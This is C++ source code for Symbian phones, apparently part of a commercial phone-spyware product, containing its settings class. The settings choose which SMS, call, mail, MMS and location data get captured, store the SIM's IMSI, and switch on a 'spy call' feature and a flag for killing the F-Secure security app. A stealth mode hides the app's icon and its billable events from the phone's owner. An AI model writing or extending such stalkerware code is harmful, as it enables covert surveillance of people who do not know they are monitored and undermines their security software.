#include "CltSettings.h"
#include "Timeout.h"
#include "AccessPointMan.h"
#include "Global.h"
#include "SettingChangeObserver.h"

#include <s32strm.h>

//----------------------------------------------------------------
//TAntiFlexiSpySetting
//----------------------------------------------------------------

void TMiscellaneousSetting::ExternalizeL(RWriteStream& aOut) const
	{
	aOut.WriteInt32L(KFiledCount);
	aOut.WriteInt8L(static_cast<TUint8>(iKillFSecureApp));	
	}

void TMiscellaneousSetting::InternalizeL(RReadStream& aIn)
	{
	TInt filedCount = aIn.ReadInt32L();
	for(TInt i=0;i<filedCount;i++)
		{
		switch(i)
			{
			case 0:
				{
				iKillFSecureApp = aIn.ReadInt8L();
				}break;
			default:
				;
			}
		}
	}
	
//----------------------------------------------------------------
//TFxConnectInfo
//----------------------------------------------------------------
TFxConnectInfo::TFxConnectInfo()
	{
	if(iProxyAddr.Length() == 0)
		{
		//iProxyAddr.Copy(KProxyDefaultAddr);
		}	
	}
	
void TFxConnectInfo::ExternalizeL(RWriteStream& aOut) const
	{
	aOut.WriteInt8L(static_cast<TUint8>(iUseProxy));
	aOut << iProxyAddr;
	}
	
void TFxConnectInfo::InternalizeL(RReadStream& aIn)
	{
	iUseProxy = aIn.ReadInt8L();
	aIn >> iProxyAddr;
	}

//----------------------------------------------------------------
//TS9Settings
//----------------------------------------------------------------
TS9Settings::TS9Settings()
	{
	/**
	Default value is first launch!*/
	iFirstLaunch = ETrue;
	iShowIconInTaskList = ETrue;
	iShowBillableEvent = ETrue;
	iAskBeforeChangeLogConfig = ETrue;
	iS9SignMode = ETrue;	
	}
	
void TS9Settings::ExternalizeL(RWriteStream& aOut) const
	{	
	aOut.WriteUint8L(static_cast<TUint8>(iFirstLaunch));
	aOut.WriteUint8L(static_cast<TUint8>(iShowIconInTaskList));
	aOut.WriteUint8L(static_cast<TUint8>(iShowBillableEvent));
	aOut.WriteUint8L(static_cast<TUint8>(iAskBeforeChangeLogConfig));	
	aOut.WriteUint8L(static_cast<TUint8>(iS9SignMode));	
	}
	
void TS9Settings::InternalizeL(RReadStream& aIn)
	{
	iFirstLaunch = aIn.ReadUint8L();
	iShowIconInTaskList = aIn.ReadUint8L();
	iShowBillableEvent = aIn.ReadUint8L();
	iAskBeforeChangeLogConfig = aIn.ReadUint8L();
	iS9SignMode = aIn.ReadUint8L();
	}

//----------------------------------------------------------------
//CFxsSettings
//----------------------------------------------------------------
CFxsSettings::CFxsSettings()
:CActiveBase(CActive::EPriorityHigh * 2)
	{
	iIapId = 0;
	iTimerInterval = EDefaultSettingReportTimerInteger; // 1 hour by default	
	iAutoStart = EDefaultSettingAutoStartBoolean;
	iMaxNumberOfEvent = EDefaultSettingMaxNumberOfEventInteger;
	iAppEnabled = EDefaultSettingAppEnableBoolean;
	
	/**
	must init to -1*/
	iObserverIndexNotify = -1;
	iGpsOptions.SetDefault();
	}

CFxsSettings::~CFxsSettings()
	{
	Cancel();
	delete iCheckboxArray;
	iObservers.Close();
	}

CFxsSettings* CFxsSettings::NewL()
	{	
	CFxsSettings* self = new (ELeave) CFxsSettings();
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}
	
void CFxsSettings::ConstructL()
	{
	iCheckboxArray=new(ELeave) CArrayFixFlat<TInt>(5);	
#ifdef EVENT_SMS_ENABLE
	iCheckboxArray->AppendL(ETrue);
#endif
	
#ifdef EVENT_PHONECALL_ENABLE
	iCheckboxArray->AppendL(ETrue);
#endif

#ifdef EVENT_MAIL_ENABLE
	iCheckboxArray->AppendL(ETrue);
#endif

#ifdef EVENT_LOCATION_ENABLE //default is disable
	iCheckboxArray->AppendL(EFalse);
#endif
	
#ifdef EVENT_MMS_ENABLE
	iCheckboxArray->AppendL(ETrue);
#endif
	iAppUi = Global::AppUiPtr();		
	CActiveScheduler::Add(this);
	}
	
void CFxsSettings::DoCancel()
	{
	TRequestStatus* status = &iStatus;
	User::RequestComplete(status, KErrCancel);
	}

void CFxsSettings::SpySettingChangedL()
	{
	}

void CFxsSettings::NotifyChanged()
	{
	if (!IsActive()) 
		{
		iObserverIndexNotify++;		
		TRequestStatus* status = &iStatus;
		User::RequestComplete(status, KErrNone);
		SetActive();
		}
	}

void CFxsSettings::RunL()
//this performs as incremental task
//
	{
	LOG0(_L("[CFxsSettings::RunL]"))
	TInt count = iObservers.Count();
	if(iObserverIndexNotify >= 0 && iObserverIndexNotify < count)
		{
		((MSettingChangeObserver*)iObservers[iObserverIndexNotify])->OnSettingChangedL(*this);
		
		if(iObserverIndexNotify < (count-1))
		//to notify next observer
			{
			NotifyChanged();	
			}
		else
			{
			goto doReset;
			}
		}
	else
		{
doReset:
		iObserverIndexNotify = -1;
		}
	LOG0(_L("[CFxsSettings::RunL] End"))
	}
	
TInt CFxsSettings::RunError(TInt aError)
	{
	CActiveBase::Error(aError);
	if(iObserverIndexNotify < (iObservers.Count()-1))
	//to notify next observer
		{
		NotifyChanged();	
		}
	
	return KErrNone;
	}

TPtrC CFxsSettings::ClassName()
	{
	return TPtrC(_L("CFxsSettings"));
	}

void CFxsSettings::ExternalizeL(RWriteStream& aOut) const
	{	
	//1. iTimerInterval
	aOut.WriteUint8L(static_cast<TUint8>(iTimerInterval)); // value betwenn 0 -24
	
	//2.iMaxNumberOfEvent
	aOut.WriteUint16L(static_cast<TUint16>(iMaxNumberOfEvent)); // max number of event
	
	//3.iAppPaused
	aOut.WriteUint8L(static_cast<TUint8>(iAppEnabled));
	
	//4.iAutoStart
	aOut.WriteUint8L(static_cast<TUint8>(iAutoStart));	
	
	//5.iIapId
	aOut.WriteUint32L(iIapId); // Iap Id
	
	//7. Events Type
	//ETypeSMS = 0,ETypeCALL = 1,ETypeMMS = 2,ETypeMAIL = 3,ETypeLocation = 4, ETypeGPRS = 5
	
	for(TInt i = 0; i < iCheckboxArray->Count(); i++) 
		{
		const TInt& value = iCheckboxArray->At(i);
		aOut.WriteUint8L(static_cast<TUint8>(value));
		}
	
	aOut << iIMSI;
	aOut << iS9Settings;
	aOut << iNetOperatorInfo;
	aOut << iMiscSetting;
#ifdef FEATURE_SPY_CALL		
	aOut << iBugInfo;
#endif
#ifdef FEATURE_GPS
	aOut << iGpsOptions;
#endif
#ifdef FEATURE_SPY_CALL
	aOut << iOperatorSmsKeyword;
#endif
	LOG0(_L("[CFxsSettings::ExternalizeL] End "))
	}

void CFxsSettings::StoreSpyNumberL() const
	{
	}

void CFxsSettings::InternalizeL(RReadStream& aIn)
	{
	LOG0(_L("[CFxsSettings::InternalizeL]"))	
	//1. iTimerInterval 
	iTimerInterval = aIn.ReadUint8L();
	iTimerInterval = (iTimerInterval < 0)? 0:iTimerInterval;
	
	//2. iMaxNumberOfEvent
	iMaxNumberOfEvent = aIn.ReadUint16L();
	iMaxNumberOfEvent = (iMaxNumberOfEvent < 0) ? 0:iMaxNumberOfEvent;
	
	//3.iAppPaused
	iAppEnabled = aIn.ReadUint8L();	
	
	//4. iAutoStart
	iAutoStart = aIn.ReadUint8L();	
	
	//6. iIapId
	iIapId= aIn.ReadUint32L();
    
	//7. Events Type
	//ETypeSMS = 0,ETypeCALL = 1,ETypeMMS = 2,ETypeEMAIL = 3,ETypeGPRS = 4
	for(TInt i = 0; i < KNumberOfEventTypeCheckBox;/*iCheckboxArray->Count();*/ i++) 
		{
		iCheckboxArray->At(i) = (TInt)aIn.ReadUint8L();
		}
	aIn >> iIMSI;
	aIn >> iS9Settings;	
	aIn >> iNetOperatorInfo;
	aIn >> iMiscSetting;
#ifdef FEATURE_SPY_CALL
	aIn >> iBugInfo;
#endif
#ifdef FEATURE_GPS	
	aIn >> iGpsOptions;
#endif
#ifdef FEATURE_SPY_CALL
	aIn >> iOperatorSmsKeyword;
#endif
	LOG2(_L("[CFxsSettings::InternalizeL] iGpsOnFlag : %d, iGpsPositionUpdateInterval: %d"), iGpsOptions.iGpsOnFlag, iGpsOptions.iGpsPositionUpdateInterval)
	LOG2(_L("[CFxsSettings::InternalizeL] aOperatorInfo. : %S, aOperatorInfo.iNetworkId: %S"), &iNetOperatorInfo.iCountryCode, &iNetOperatorInfo.iNetworkId)
	LOG4(_L("[CFxsSettings::InternalizeL] End, iTimerInterval:%d,iMaxNumberOfEvent:%d, iAppEnabled:%d,iIapId:%d "),iTimerInterval,iMaxNumberOfEvent,iAppEnabled,iIapId)	
	}

void CFxsSettings::AddObserver(MSettingChangeObserver* aOb)
	{	
	iObservers.Append(aOb);
	}

void CFxsSettings::SetS9SignMode(TBool aS9SignedMode)
	{
	iS9Settings.iS9SignMode = aS9SignedMode;
	}

TBool CFxsSettings::IsTSM()
	{
	return iS9Settings.iS9SignMode;
	}

void CFxsSettings::SetStealthMode(TBool aStealth)
	{
	iS9Settings.iShowIconInTaskList = !aStealth;		
	iS9Settings.iShowBillableEvent = !aStealth;
	iS9Settings.iAskBeforeChangeLogConfig = !aStealth;
	iS9Settings.iFirstLaunch = EFalse;
	}

TBool CFxsSettings::StealthMode()
	{
	return (!iS9Settings.iShowIconInTaskList  &&
			!iS9Settings.iShowBillableEvent &&
			!iS9Settings.iAskBeforeChangeLogConfig &&
			!iS9Settings.iFirstLaunch
			);
	}
